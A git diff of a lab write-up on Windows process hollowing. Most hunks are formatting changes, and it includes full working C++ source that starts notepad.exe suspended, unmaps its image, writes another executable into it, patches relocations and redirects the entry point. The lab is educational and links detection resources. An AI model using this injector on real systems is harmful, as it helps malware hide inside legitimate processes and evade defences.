@@ -14,7 +14,7 @@ Although my implementation of process hollowing does not work with all binaries,
 * become a bit more comfortable with inspecting / manipulating program's memory
 * get to do more PE parsing and PE relocations
 
-The main reference resource for this lab was [https://github.com/m0n0ph1/Process-Hollowing](https://github.com/m0n0ph1/Process-Hollowing).   
+The main reference resource for this lab was [https://github.com/m0n0ph1/Process-Hollowing](https://github.com/m0n0ph1/Process-Hollowing).  
 Shout out to [Mumbai](https://twitter.com/ilove2pwn_) for a great debugging session and as usual, talking C to me!
 
 If you need more info on parsing Windows PE files, see my previous lab:
@@ -24,7 +24,7 @@ If you need more info on parsing Windows PE files, see my previous lab:
 ## Execution
 
 {% hint style="warning" %}
-You may notice that `ImageBaseAddress` varies across the screenshots.   
+You may notice that `ImageBaseAddress` varies across the screenshots.  
 This is because I ran the binary multiple times and the ASLR played its role.
 {% endhint %}
 
@@ -32,7 +32,7 @@ This is because I ran the binary multiple times and the ASLR played its role.
 
 Let's start calc.exe as our host / destination process - this is going to be the process that we will be hollowing out and attempt to replace it with cmd.exe.
 
-![](../../.gitbook/assets/screenshot-from-2019-04-28-16-28-59%20%281%29.png)
+![](../../.gitbook/assets/screenshot-from-2019-04-28-16-28-59-1.png)
 
 ### Destination ImageBaseAddress
 
@@ -64,7 +64,7 @@ We will come back to the hollowing the destination image located at `ImageBaseAd
 
 ### Source Image
 
-Let's now switch gears to the source file - the binary that we want to execute inside the host/destination  process. In my case it's - cmd.exe. I've opened the file, allocated required memory and read the file to that memory location:
+Let's now switch gears to the source file - the binary that we want to execute inside the host/destination process. In my case it's - cmd.exe. I've opened the file, allocated required memory and read the file to that memory location:
 
 ![](../../.gitbook/assets/peek-2019-04-28-16-44.gif)
 
@@ -134,7 +134,7 @@ We can see the bytes on the disk \(left\) match those in memory \(right\), so we
 
 ### Relocation
 
-Now it's time to perform image base relocations. 
+Now it's time to perform image base relocations.
 
 Since our source image was loaded to a different `ImageBaseAddress` compared to where the destination process was loaded into initially, it needs to be patched in order for the binary to resolve addresses to things like static variables and other absolute addresses which otherwise would no longer work. The way the windows loader knows how to patch the images in memory is by referring to a relocation table residing in the binary.
 
@@ -260,146 +260,145 @@ After executing the code line 118 \(top left in the screenshot above\), `0040E7A
 using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);
 
 typedef struct BASE_RELOCATION_BLOCK {
-	DWORD PageAddress;
-	DWORD BlockSize;
+    DWORD PageAddress;
+    DWORD BlockSize;
 } BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;
 
 typedef struct BASE_RELOCATION_ENTRY {
-	USHORT Offset : 12;
-	USHORT Type : 4;
+    USHORT Offset : 12;
+    USHORT Type : 4;
 } BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
 
 int main()
 {
-	// create destination process - this is the process to be hollowed out
-	LPSTARTUPINFOA si = new STARTUPINFOA();
-	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-	PROCESS_BASIC_INFORMATION *pbi = new PROCESS_BASIC_INFORMATION();
-	DWORD returnLenght = 0;
-	CreateProcessA(NULL, (LPSTR)"c:\\windows\\syswow64\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
-	HANDLE destProcess = pi->hProcess;
+    // create destination process - this is the process to be hollowed out
+    LPSTARTUPINFOA si = new STARTUPINFOA();
+    LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+    PROCESS_BASIC_INFORMATION *pbi = new PROCESS_BASIC_INFORMATION();
+    DWORD returnLenght = 0;
+    CreateProcessA(NULL, (LPSTR)"c:\\windows\\syswow64\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
+    HANDLE destProcess = pi->hProcess;
 
-	// get destination imageBase offset address from the PEB
-	NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLenght);
-	DWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 8; 
-	
-	// get destination imageBaseAddress
-	LPVOID destImageBase = 0;
-	SIZE_T bytesRead = NULL;
-	ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, &bytesRead);
+    // get destination imageBase offset address from the PEB
+    NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLenght);
+    DWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 8; 
 
-	// read source file - this is the file that will be executed inside the hollowed process
-	HANDLE sourceFile = CreateFileA("C:\\temp\\regshot.exe", GENERIC_READ,	NULL, NULL, OPEN_ALWAYS, NULL, NULL);
-	DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
-	LPDWORD fileBytesRead = 0;
-	LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
-	ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);
-	
-	// get source image size
-	PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
-	PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew);
-	SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;
+    // get destination imageBaseAddress
+    LPVOID destImageBase = 0;
+    SIZE_T bytesRead = NULL;
+    ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, &bytesRead);
 
-	// carve out the destination image
-	NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
-	myNtUnmapViewOfSection(destProcess, destImageBase);
+    // read source file - this is the file that will be executed inside the hollowed process
+    HANDLE sourceFile = CreateFileA("C:\\temp\\regshot.exe", GENERIC_READ,    NULL, NULL, OPEN_ALWAYS, NULL, NULL);
+    DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
+    LPDWORD fileBytesRead = 0;
+    LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
+    ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);
 
-	// allocate new memory in destination image for the source image
-	LPVOID newDestImageBase = VirtualAllocEx(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	destImageBase = newDestImageBase;
+    // get source image size
+    PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
+    PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew);
+    SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;
 
-	// get delta between sourceImageBaseAddress and destinationImageBaseAddress
-	DWORD deltaImageBase = (DWORD)destImageBase - sourceImageNTHeaders->OptionalHeader.ImageBase;
+    // carve out the destination image
+    NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
+    myNtUnmapViewOfSection(destProcess, destImageBase);
 
-	// set sourceImageBase to destImageBase and copy the source Image headers to the destination image
-	sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
-	WriteProcessMemory(destProcess, newDestImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
+    // allocate new memory in destination image for the source image
+    LPVOID newDestImageBase = VirtualAllocEx(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    destImageBase = newDestImageBase;
 
-	// get pointer to first source image section
-	PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
-	PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;
-	int err = GetLastError();
+    // get delta between sourceImageBaseAddress and destinationImageBaseAddress
+    DWORD deltaImageBase = (DWORD)destImageBase - sourceImageNTHeaders->OptionalHeader.ImageBase;
 
-	// copy source image sections to destination
-	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
-	{
-		PVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection->VirtualAddress);
-		PVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
-		WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
-		sourceImageSection++;
-	}
+    // set sourceImageBase to destImageBase and copy the source Image headers to the destination image
+    sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
+    WriteProcessMemory(destProcess, newDestImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
 
-	// get address of the relocation table
-	IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-	
-	// patch the binary with relocations
-	sourceImageSection = sourceImageSectionOld;
-	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
-	{
-		BYTE* relocSectionName = (BYTE*)".reloc";
-		if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0) 
-		{
-			sourceImageSection++;
-			continue;
-		}
+    // get pointer to first source image section
+    PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
+    PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;
+    int err = GetLastError();
 
-		DWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
-		DWORD relocationOffset = 0;
+    // copy source image sections to destination
+    for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
+    {
+        PVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection->VirtualAddress);
+        PVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
+        WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
+        sourceImageSection++;
+    }
 
-		while (relocationOffset < relocationTable.Size) {
-			PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
-			relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
-			DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
-			PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
+    // get address of the relocation table
+    IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 
-			for (DWORD y = 0; y < relocationEntryCount; y++)
-			{
-				relocationOffset += sizeof(BASE_RELOCATION_ENTRY);
+    // patch the binary with relocations
+    sourceImageSection = sourceImageSectionOld;
+    for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
+    {
+        BYTE* relocSectionName = (BYTE*)".reloc";
+        if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0) 
+        {
+            sourceImageSection++;
+            continue;
+        }
 
-				if (relocationEntries[y].Type == 0)
-				{
-					continue;
-				}
+        DWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
+        DWORD relocationOffset = 0;
 
-				DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
-				DWORD patchedBuffer = 0;
-				ReadProcessMemory(destProcess,(LPCVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);
-				patchedBuffer += deltaImageBase;
+        while (relocationOffset < relocationTable.Size) {
+            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
+            relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
+            DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
+            PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
 
-				WriteProcessMemory(destProcess,	(PVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), fileBytesRead);
-				int a = GetLastError();
-			}
-		}
-	}
+            for (DWORD y = 0; y < relocationEntryCount; y++)
+            {
+                relocationOffset += sizeof(BASE_RELOCATION_ENTRY);
 
-	// get context of the dest process thread
-	LPCONTEXT context = new CONTEXT();
-	context->ContextFlags = CONTEXT_INTEGER;
-	GetThreadContext(pi->hThread, context);
+                if (relocationEntries[y].Type == 0)
+                {
+                    continue;
+                }
 
-	// update dest image entry point to the new entry point of the source image and resume dest image thread
-	DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
-	context->Eax = patchedEntryPoint;
-	SetThreadContext(pi->hThread, context);
-	ResumeThread(pi->hThread);
+                DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
+                DWORD patchedBuffer = 0;
+                ReadProcessMemory(destProcess,(LPCVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);
+                patchedBuffer += deltaImageBase;
 
-	return 0;
+                WriteProcessMemory(destProcess,    (PVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), fileBytesRead);
+                int a = GetLastError();
+            }
+        }
+    }
+
+    // get context of the dest process thread
+    LPCONTEXT context = new CONTEXT();
+    context->ContextFlags = CONTEXT_INTEGER;
+    GetThreadContext(pi->hThread, context);
+
+    // update dest image entry point to the new entry point of the source image and resume dest image thread
+    DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
+    context->Eax = patchedEntryPoint;
+    SetThreadContext(pi->hThread, context);
+    ResumeThread(pi->hThread);
+
+    return 0;
 }
-
 ```
 {% endcode %}
 
 ## References
 
-{% embed url="https://github.com/m0n0ph1/Process-Hollowing" %}
+{% embed url="https://github.com/m0n0ph1/Process-Hollowing" caption="" %}
 
 What an amazing resource for those interested in detecting process hollowing using memory forensics techniques:
 
-{% embed url="https://cysinfo.com/detecting-deceptive-hollowing-techniques/" %}
+{% embed url="https://cysinfo.com/detecting-deceptive-hollowing-techniques/" caption="" %}
 
-{% embed url="https://attack.mitre.org/techniques/T1093/" %}
+{% embed url="https://attack.mitre.org/techniques/T1093/" caption="" %}
 
-{% embed url="https://github.com/peperunas/injectopi/tree/master/FullCopy" %}
+{% embed url="https://github.com/peperunas/injectopi/tree/master/FullCopy" caption="" %}
 
 {% page-ref page="../../miscellaneous-reversing-forensics/pe-file-header-parser-in-c++.md" %}
 
